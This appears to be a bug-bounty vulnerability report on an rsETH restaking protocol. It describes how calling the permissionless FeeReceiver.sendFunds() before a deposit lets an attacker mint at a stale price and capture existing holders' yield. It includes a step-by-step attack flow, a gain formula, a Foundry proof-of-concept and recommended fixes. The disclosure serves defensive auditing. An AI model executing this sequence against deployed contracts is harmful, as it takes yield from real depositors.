### Title
Stale `rsETHPrice` Allows Yield Capture via Public `FeeReceiver.sendFunds()` Front-Run — (`contracts/LRTDepositPool.sol::getRsETHAmountToMint`)

---

### Summary

An unprivileged EOA can atomically call the permissionless `FeeReceiver.sendFunds()` to flush accumulated MEV/execution-layer rewards into the deposit pool, then immediately call `depositETH` / `depositAsset`. Because `getRsETHAmountToMint` divides by the **stored** (stale) `rsETHPrice` rather than a freshly computed one, the depositor receives more rsETH than their ETH contribution warrants. When `updateRSETHPrice()` is subsequently called, the reward batch is treated as new yield and diluted across all holders — including the attacker — transferring a measurable fraction of that yield from existing holders to the attacker.

---

### Finding Description

**Step 1 — Reward accumulation.**
ETH rewards (MEV, execution-layer) accumulate in `FeeReceiver`. The protocol comment in `getETHDistributionData()` explicitly states these are **not** counted in TVL until moved: [1](#0-0) 

**Step 2 — Public flush.**
`FeeReceiver.sendFunds()` has **no access control**. Any EOA can call it to push the entire FeeReceiver balance into the deposit pool: [2](#0-1) 

After this call, `address(this).balance` of the deposit pool increases by `R` (the reward amount), and `getETHDistributionData()` immediately reflects it: [3](#0-2) 

**Step 3 — Stale price used for minting.**
`getRsETHAmountToMint` reads `lrtOracle.rsETHPrice()`, which is a **stored state variable** last written by a prior `updateRSETHPrice()` call. It is never refreshed inside the deposit flow: [4](#0-3) 

`rsETHPrice` in `LRTOracle` is only updated by explicit calls to `updateRSETHPrice()` / `updateRSETHPriceAsManager()`: [5](#0-4) 

**Step 4 — Attacker deposits at the stale (too-low) price.**
With TVL now inflated by `R` but `rsETHPrice` still reflecting the pre-reward state `P = T/S`, the attacker deposits `A` ETH and receives `A/P = A·S/T` rsETH — more than the fair share `A·S/(T+R)`.

**Step 5 — Price update distributes reward to all holders including attacker.**
When `_updateRsETHPrice()` is called, `previousTVL = (S + A/P)·P = T + A`, so `rewardAmount = (T + R + A) − (T + A) = R`. The reward `R` is then split across the enlarged supply `S + A/P`, giving the attacker a proportional cut: [6](#0-5) 

**Attacker's gain:**
```
gain = A · R · (1 − feeRate) / (T + A)
```
This is yield that should have accrued exclusively to the `S` pre-existing rsETH holders.

---

### Impact Explanation

**High — Theft of unclaimed yield.**

The attack does not steal deposited principal; it dilutes the yield batch `R` that was pending for existing rsETH holders. The fraction stolen scales with `A / (T + A)`, so a large deposit relative to TVL can capture a significant portion of accumulated rewards. The `RSETH.checkDailyMintLimit` cap bounds the maximum `A` per day but does not prevent the attack; it only limits its magnitude per period. [7](#0-6) 

The claimed Critical impact (direct theft of user funds) is **not** achieved — principal is conserved. The correct Immunefi classification is **High: Theft of unclaimed yield**.

---

### Likelihood Explanation

- `FeeReceiver.sendFunds()` is unconditionally public; no role, no guard.
- `updateRSETHPrice()` is not called atomically with deposits.
- The window between `sendFunds()` and the next oracle update is predictable (off-chain keeper cadence) and can be exploited in a single block by any EOA.
- No special setup is required beyond holding ETH.

---

### Recommendation

1. **Refresh price before minting.** Call `_updateRsETHPrice()` (or an equivalent internal snapshot) inside `_beforeDeposit` so `getRsETHAmountToMint` always uses a price that accounts for the current deposit-pool balance.
2. **Restrict `FeeReceiver.sendFunds()`.** Add a role check (e.g., `onlyRole(LRTConstants.MANAGER)`) so rewards cannot be flushed by an arbitrary caller at a strategically chosen moment.
3. **Alternatively**, exclude the deposit pool's raw ETH balance from TVL until it is explicitly "accounted" by a privileged operator, keeping the reward-flush and price-update atomic.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/LRTDepositPool.sol";
import "../contracts/LRTOracle.sol";
import "../contracts/FeeReceiver.sol";
import "../contracts/RSETH.sol";

contract YieldCapturePoC is Test {
    // Assume a fork/local setup with all contracts deployed and initialized.
    // T = 1000 ETH TVL, S = 1000e18 rsETH supply, P = 1e18 (1:1)
    // R = 10 ETH accumulated in FeeReceiver

    LRTDepositPool depositPool;
    LRTOracle      oracle;
    FeeReceiver    feeReceiver;
    RSETH          rseth;

    address attacker = address(0xBEEF);

    function testYieldCapture() public {
        // --- baseline ---
        uint256 priceBefore = oracle.rsETHPrice(); // e.g. 1e18

        // Step 1: attacker flushes FeeReceiver (public, no auth)
        feeReceiver.sendFunds();
        // deposit pool balance now +10 ETH, rsETHPrice still stale

        // Step 2: attacker deposits at stale price
        vm.deal(attacker, 100 ether);
        vm.prank(attacker);
        depositPool.depositETH{value: 100 ether}(0, "");

        uint256 rsethReceived = rseth.balanceOf(attacker);
        // rsethReceived = 100e18 / priceBefore  (stale, too generous)

        // Step 3: price update — reward R is now split with attacker
        oracle.updateRSETHPrice();
        uint256 priceAfter = oracle.rsETHPrice();

        uint256 attackerValueAfter = rsethReceived * priceAfter / 1e18;

        // Invariant: attacker should not receive more than 100 ETH worth
        assertLe(attackerValueAfter, 100 ether, "Attacker captured yield from existing holders");
        // This assertion FAILS — attacker's rsETH is worth > 100 ETH
    }
}
```

The invariant `attackerValueAfter <= 100 ether` fails because the attacker's rsETH appreciates by their proportional share of the flushed reward `R`, confirming theft of unclaimed yield from pre-existing holders.

### Citations

**File:** contracts/LRTDepositPool.sol (L464-466)
```text
    /// @dev provides ETH amount distribution data among depositPool, NDCs and eigenLayer
    /// @dev rewards are not accounted here
    /// it will automatically be accounted once it is moved from feeReceiver/rewardReceiver to depositPool
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L519-520)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L244-250)
```text
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**File:** contracts/RSETH.sol (L42-56)
```text
    modifier checkDailyMintLimit(uint256 amount) {
        // Check if we need to reset the period if it has been more than 24 hours
        if (block.timestamp >= periodStartTime + 1 days) {
            currentPeriodMintedAmount = 0;
            periodStartTime = getCurrentPeriodStartTime();
        }

        // Check if minting would exceed the daily limit
        if (currentPeriodMintedAmount + amount > maxMintAmountPerDay) {
            revert DailyMintLimitExceeded(currentPeriodMintedAmount + amount, maxMintAmountPerDay);
        }

        currentPeriodMintedAmount += amount;
        _;
    }
```
